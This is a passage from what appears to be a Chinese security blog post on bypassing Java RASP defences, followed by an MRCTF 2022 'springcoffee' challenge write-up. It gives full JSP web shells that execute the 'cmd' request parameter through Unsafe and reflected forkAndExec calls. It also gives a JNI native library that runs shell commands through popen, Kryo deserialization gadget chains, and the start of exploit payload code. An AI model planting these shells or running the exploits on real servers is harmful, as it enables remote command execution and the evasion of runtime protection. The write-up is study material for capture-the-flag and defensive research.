                <span class="n">in</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">%&gt;</span>
<span class="o">&lt;%</span>
    <span class="n">String</span><span class="o">[]</span> <span class="n">str</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameterValues</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">str</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">InputStream</span> <span class="n">in</span>     <span class="o">=</span> <span class="n">start</span><span class="o">(</span><span class="n">str</span><span class="o">);</span>
        <span class="n">String</span>      <span class="n">result</span> <span class="o">=</span> <span class="n">inputStreamToString</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"&lt;pre&gt;"</span><span class="o">);</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"&lt;/pre&gt;"</span><span class="o">);</span>
        <span class="n">out</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
        <span class="n">out</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">%&gt;</span>
</pre></div>
<h2 data-content="1" id="42d709d54cb1fc98e42905caf846e8c8">Unsafe+forkAndExec</h2>
<p>如果<code>RASP</code>把<code>UNIXProcess/ProcessImpl</code>类的构造方法给拦截了，依旧可以绕过，可以直接通过触发<code>forkAndExec</code>的形式来绕过，因为无论是<code>UNIXProcess</code>或<code>ProcessImpl</code>最终触发的方法是<code>forkAndExec</code>。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240305215058-6541f28a-daf7-1.png"/></p>
<blockquote>
<p>在UNIXProcess中可以看到<code>forkAndExec</code>的参数内容，多出了<code>lanuchMechanism</code>与<code>helperpath</code>，其它的参数内容与<code>UNIXProcess</code>是一致的</p>
</blockquote>
<ol>
<li>使用<code>sun.misc.Unsafe.allocateInstance(Class)</code>特性可以无需<code>new</code>或者<code>newInstance</code>创建<code>UNIXProcess/ProcessImpl</code>类对象。</li>
<li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>forkAndExec</code>方法。</li>
<li>通过反射构造出<code>ordinal</code>和<code>helperpath</code>参数，并构造出<code>forkAndExec</code>方法</li>
<li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>initStreams</code>方法初始化输入输出结果流对象。</li>
<li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>getInputStream</code>方法获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)。</li>
</ol>
<div class="highlight"><pre><span></span><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">contentType</span><span class="o">=</span><span class="s">"text/html;charset=UTF-8"</span> <span class="n">language</span><span class="o">=</span><span class="s">"java"</span> <span class="o">%&gt;</span>
<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"sun.misc.Unsafe"</span> <span class="o">%&gt;</span>
<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.io.ByteArrayOutputStream"</span> <span class="o">%&gt;</span>
<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.io.InputStream"</span> <span class="o">%&gt;</span>
<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.lang.reflect.Field"</span> <span class="o">%&gt;</span>
<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.lang.reflect.Method"</span> <span class="o">%&gt;</span>
<span class="o">&lt;%!</span>
    <span class="kt">byte</span><span class="o">[]</span> <span class="nf">toCString</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">s</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span>  <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">getBytes</span><span class="o">();</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">result</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">bytes</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="mi">1</span><span class="o">];</span>
        <span class="n">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">bytes</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span>
                <span class="n">result</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span>
                <span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
        <span class="n">result</span><span class="o">[</span><span class="n">result</span><span class="o">.</span><span class="na">length</span> <span class="o">-</span> <span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mi">0</span><span class="o">;</span>
        <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">%&gt;</span>
<span class="o">&lt;%</span>
    <span class="n">String</span><span class="o">[]</span> <span class="n">strs</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameterValues</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">strs</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Field</span> <span class="n">theUnsafeField</span> <span class="o">=</span> <span class="n">Unsafe</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"theUnsafe"</span><span class="o">);</span>
        <span class="n">theUnsafeField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">Unsafe</span> <span class="n">unsafe</span> <span class="o">=</span> <span class="o">(</span><span class="n">Unsafe</span><span class="o">)</span> <span class="n">theUnsafeField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span> <span class="c1">//通过get方法得到unsafe对象</span>
        <span class="n">Class</span> <span class="n">processClass</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">processClass</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.UNIXProcess"</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">processClass</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.ProcessImpl"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="n">Object</span> <span class="n">processObject</span> <span class="o">=</span> <span class="n">unsafe</span><span class="o">.</span><span class="na">allocateInstance</span><span class="o">(</span><span class="n">processClass</span><span class="o">);</span><span class="c1">//创建UNIXProcess对象</span>
        <span class="c1">//原代码</span>
        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">args</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">strs</span><span class="o">.</span><span class="na">length</span> <span class="o">-</span> <span class="mi">1</span><span class="o">][];</span>
        <span class="kt">int</span>      <span class="n">size</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> 
        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
            <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">strs</span><span class="o">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="o">].</span><span class="na">getBytes</span><span class="o">();</span>
            <span class="n">size</span> <span class="o">+=</span> <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">length</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">argBlock</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">size</span><span class="o">];</span>
        <span class="kt">int</span>    <span class="n">i</span>        <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
        <span class="k">for</span> <span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">arg</span> <span class="o">:</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">arg</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">argBlock</span><span class="o">,</span> <span class="n">i</span><span class="o">,</span> <span class="n">arg</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
            <span class="n">i</span> <span class="o">+=</span> <span class="n">arg</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="mi">1</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kt">int</span><span class="o">[]</span> <span class="n">envc</span>                 <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span>
        <span class="kt">int</span><span class="o">[]</span> <span class="n">std_fds</span>              <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[]{-</span><span class="mi">1</span><span class="o">,</span> <span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="o">-</span><span class="mi">1</span><span class="o">};</span>
        <span class="c1">//构造forkAndExec需要的参数</span>
        <span class="n">Field</span> <span class="n">launchMechanismField</span> <span class="o">=</span> <span class="n">processClass</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"launchMechanism"</span><span class="o">);</span>
        <span class="n">Field</span> <span class="n">helperpathField</span>      <span class="o">=</span> <span class="n">processClass</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"helperpath"</span><span class="o">);</span>
        <span class="n">launchMechanismField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">helperpathField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="c1">//从UNIXProcess中得到launchMechanism和Helperpath</span>
        <span class="n">Object</span> <span class="n">launchMechanismObject</span> <span class="o">=</span> <span class="n">launchMechanismField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">processObject</span><span class="o">);</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">helperpathObject</span>      <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">[])</span> <span class="n">helperpathField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">processObject</span><span class="o">);</span>
        <span class="kt">int</span> <span class="n">ordinal</span> <span class="o">=</span> <span class="o">(</span><span class="kt">int</span><span class="o">)</span> <span class="n">launchMechanismObject</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"ordinal"</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="n">launchMechanismObject</span><span class="o">);</span>
       <span class="c1">//反射forkAndExec方法</span>
        <span class="n">Method</span> <span class="n">forkMethod</span> <span class="o">=</span> <span class="n">processClass</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"forkAndExec"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span>
                <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
                <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">boolean</span><span class="o">.</span><span class="na">class</span>
        <span class="o">});</span>
        <span class="n">forkMethod</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="o">(</span><span class="kt">int</span><span class="o">)</span> <span class="n">forkMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">processObject</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span>
                <span class="n">ordinal</span> <span class="o">+</span> <span class="mi">1</span><span class="o">,</span> <span class="n">helperpathObject</span><span class="o">,</span> <span class="n">toCString</span><span class="o">(</span><span class="n">strs</span><span class="o">[</span><span class="mi">0</span><span class="o">]),</span> <span class="n">argBlock</span><span class="o">,</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span><span class="o">,</span>
                <span class="kc">null</span><span class="o">,</span> <span class="n">envc</span><span class="o">[</span><span class="mi">0</span><span class="o">],</span> <span class="kc">null</span><span class="o">,</span> <span class="n">std_fds</span><span class="o">,</span> <span class="kc">false</span>
        <span class="o">});</span>
        <span class="c1">// 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流</span>
        <span class="n">Method</span> <span class="n">initStreamsMethod</span> <span class="o">=</span> <span class="n">processClass</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"initStreams"</span><span class="o">,</span> <span class="kt">int</span><span class="o">[].</span><span class="na">class</span><span class="o">);</span>
        <span class="n">initStreamsMethod</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">initStreamsMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">processObject</span><span class="o">,</span> <span class="n">std_fds</span><span class="o">);</span>
        <span class="c1">//获取输出内容</span>
        <span class="n">Method</span> <span class="n">getInputStreamMethod</span> <span class="o">=</span> <span class="n">processClass</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getInputStream"</span><span class="o">);</span>
        <span class="n">getInputStreamMethod</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="o">(</span><span class="n">InputStream</span><span class="o">)</span> <span class="n">getInputStreamMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">processObject</span><span class="o">);</span>
        <span class="n">ByteArrayOutputStream</span> <span class="n">baos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
        <span class="kt">int</span>                   <span class="n">a</span>    <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
        <span class="kt">byte</span><span class="o">[]</span>                <span class="n">b</span>    <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">1024</span><span class="o">];</span>
        <span class="k">while</span> <span class="o">((</span><span class="n">a</span> <span class="o">=</span> <span class="n">in</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">b</span><span class="o">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">baos</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">b</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">a</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"&lt;pre&gt;"</span><span class="o">);</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">baos</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"&lt;/pre&gt;"</span><span class="o">);</span>
        <span class="n">out</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
        <span class="n">out</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">%&gt;</span>
</pre></div>
<h2 data-content="1" id="961201f87572ae820027e100d86b4978">JNI</h2>
<p><code>JNI</code>（Java Native Interface）是Java提供的一个用于和本地（Native）代码交互的编程接口。通过<code>JNI</code>，Java程序可以调用C、C++等本地编程语言编写的函数，并且本地代码也可以调用Java程序中的方法，原本是为了解决Java无法直接访问底层系统资源或者利用本地库的问题，这里也可以用于绕过<code>RASP</code>。通过<code>JNI</code>加载<code>dll</code>动态链接库或动态共享库<code>so</code>来达到本地执行的效果。</p>
<p>通过<code>JNI</code>使用<code>dll</code>例子：</p>
<p>要写一个命令执行的<code>Native</code>类，将类编译成<code>.class</code>的形式</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Command</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">native</span> <span class="n">String</span> <span class="nf">exec</span><span class="o">(</span><span class="n">String</span> <span class="n">cmd</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>通过<code>java</code>命令生成<code>C</code>语言文件</p>
<div class="highlight"><pre><span></span><span class="n">javac</span> <span class="o">-</span><span class="n">cp</span> <span class="o">.</span> <span class="o">./</span><span class="n">Command</span><span class="o">.</span><span class="na">java</span> <span class="o">-</span><span class="n">h</span> <span class="n">com</span><span class="o">.</span><span class="na">example</span><span class="o">.</span><span class="na">jdk17bypass</span><span class="o">.</span><span class="na">demos</span><span class="o">.</span><span class="na">Command</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240305215117-7087af9a-daf7-1.png"/></p>
<p>编写<code>C</code>语言的命令执行文件</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">"com_example_jdk17bypass_demos_Command.h"</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">"jni.h"</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">execmd</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">result</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="o">*</span><span class="mi">12</span><span class="p">];</span>   
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">pipe</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span> 
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pipe</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">feof</span><span class="p">(</span><span class="n">pipe</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">pipe</span><span class="p">))</span>
        <span class="p">{</span> 
            <span class="n">strcat</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">pclose</span><span class="p">(</span><span class="n">pipe</span><span class="p">);</span> 
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>     
<span class="p">}</span>
<span class="n">JNIEXPORT</span> <span class="n">jstring</span> <span class="n">JNICALL</span> <span class="nf">Java_com_example_jdk17bypass_demos_Command_exec</span><span class="p">(</span><span class="n">JNIEnv</span> <span class="o">*</span><span class="n">env</span><span class="p">,</span> <span class="n">jobject</span> <span class="n">class_object</span><span class="p">,</span> <span class="n">jstring</span> <span class="n">jstr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cstr</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">GetStringUTFChars</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">jstr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="kt">char</span> <span class="n">result</span><span class="p">[</span><span class="mi">1024</span> <span class="o">*</span> <span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span> 
    <span class="n">execmd</span><span class="p">(</span><span class="n">cstr</span><span class="p">,</span> <span class="n">result</span><span class="p">));</span>
    <span class="kt">char</span> <span class="n">return_messge</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
    <span class="n">strcat</span><span class="p">(</span><span class="n">return_messge</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
    <span class="n">jstring</span> <span class="n">cmdresult</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">NewStringUTF</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">return_messge</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">cmdresult</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p><code>WIndows</code>安装 <code>gcc</code>命令指定各种<code>.h</code> 文件的目录对编写好的<code>C</code>文件编译成<code>dll</code>文件</p>
<div class="highlight"><pre><span></span>gcc -I <span class="s2">"C:\Program Files\Java\jdk-17.0.2\include"</span> -I <span class="s2">"C:\Program Files\Java\jdk-17.0.2\include\win32"</span> -D__int64<span class="o">=</span><span class="s2">"long long"</span> --shared <span class="s2">"A:\IDEA\IdeaProjects\jdk17bypass\src\jni.c"</span>  -o ./jni.dll
</pre></div>
<p>最终通过<code>System.loadLibrary</code>加载<code>dll</code>文件即可，这里会从系统环境变量中逐个寻找<code>jni.dll</code></p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">System</span><span class="o">.</span><span class="na">loadLibrary</span><span class="o">(</span><span class="s">"jni"</span><span class="o">);</span> <span class="c1">//load()指定绝对路径</span>
        <span class="n">Command</span> <span class="n">command</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Command</span><span class="o">();</span>
        <span class="n">String</span> <span class="n">ipconfig</span> <span class="o">=</span> <span class="n">command</span><span class="o">.</span><span class="na">exec</span><span class="o">(</span><span class="s">"calc"</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">ipconfig</span><span class="o">);</span>
    <span class="o">}</span>
</pre></div>
<p>具体一些利用脚本等</p>
<p>参考连接：<a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md#cshlcl" target="_blank">绕过脚本例子</a></p>
<h1 data-content="1" id="ff0f18368005ee149ab0fff38d44454a">[MRCTF 2022] springcoffee</h1>
<p>因为有题目的附件，因此先看题目的<code>docker</code>附件，看到了它的启动方式是<code>java -javaagent:jrasp.jar</code>，说明题目是有<code>RASP</code>限制的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240305215126-75d10640-daf7-1.png"/></p>
<p>先看<code>springcoffe.jar</code>，也就是题目网站构造的源代码，有两个<code>路由</code>，<code>/coffer/order</code>通过接收<code>CoffeeRequest</code>类，进行<code>base64</code>解码后，使用<code>kyro.readClassAndObject()</code>进行反序列化。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240305215135-7b0e827c-daf7-1.png"/></p>
<p>另一个是<code>coffee/demo</code>路由，接收<code>json</code>形式的字符串，进行解析后判断字符串中是否有<code>polish</code>，然后创建了一个<code>Kry</code>类，遍历获取了<code>Kryo</code>所有的<code>set</code>方法，如果<code>方法名</code>在<code>json字符串</code>中并且它的参数类型并步是私有的，就会实例化并且触发这个方法，最下面的代码将一个自定义的<code>Mocha</code>类通过<code>register</code>注册了进去，并且进行了序列化。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240305215143-7fc6d83c-daf7-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240305215146-81e6922e-daf7-1.png"/></p>
<p>在<code>/coffee/order</code>中是接收了参数进行了<code>Kyro</code>反序列化的，因此这里应当是<code>Kyro</code>反序列化的打法，<code>Kyro</code>反序列化与<code>Hessian</code>原理是相似的，都是基于<code>Field</code>的反序列化机制，最终都会走到<code>HashMap.put()</code>方法中，所有与<code>HashCode</code>等开头的相关链子都可以联系起来，在依赖中存在<code>Jackson</code>、<code>ROME</code>、<code>Spring aop</code>依赖都是可利用的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240305215159-8970494a-daf7-1.png"/></p>
<p>根据上面的依赖，这里可以使用的链子我想到的有两条。</p>
<div class="highlight"><pre><span></span>kyro#readObject<span class="o">()</span>-&gt;hashMap#put<span class="o">()</span>-&gt;EqualsBean#hashCode<span class="o">()</span>-&gt;toStringBean#toString<span class="o">()</span>-&gt;SignedObject#getObject-&gt;HashMap#readObject<span class="o">()</span>-&gt;EqualsBean#hashCode<span class="o">()</span>-&gt;toStringBean#toString<span class="o">()</span>-&gt;TemplatesImpl#getOutputProperties<span class="o">()</span>

或者

kyro#readObject<span class="o">()</span>-&gt;hashMap#put<span class="o">()</span>-&gt;HotSwappableTargetSource#equals<span class="o">()</span>-&gt;Xstring#equals<span class="o">()</span>-&gt;BaseJsonNode#toString<span class="o">()</span>-&gt;templatesImpl#getOutputProperties<span class="o">()</span>
</pre></div>
<p>两条链子的<code>payload</code>如下：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"aiwin"</span><span class="o">);</span>
        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_class"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">getTemplates</span><span class="o">()});</span>
        <span class="n">ToStringBean</span> <span class="n">toStringBean</span><span class="o">=</span><span class="k">new</span> <span class="n">ToStringBean</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">templates</span><span class="o">);</span>
        <span class="n">EqualsBean</span> <span class="n">equalsBean</span><span class="o">=</span><span class="k">new</span> <span class="n">EqualsBean</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="s">"111"</span><span class="o">);</span>
        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">hashMap</span><span class="o">=</span><span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">equalsBean</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>

        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">equalsBean</span><span class="o">,</span><span class="s">"_beanClass"</span><span class="o">,</span><span class="n">ToStringBean</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">equalsBean</span><span class="o">,</span><span class="s">"_obj"</span><span class="o">,</span><span class="n">toStringBean</span><span class="o">);</span>
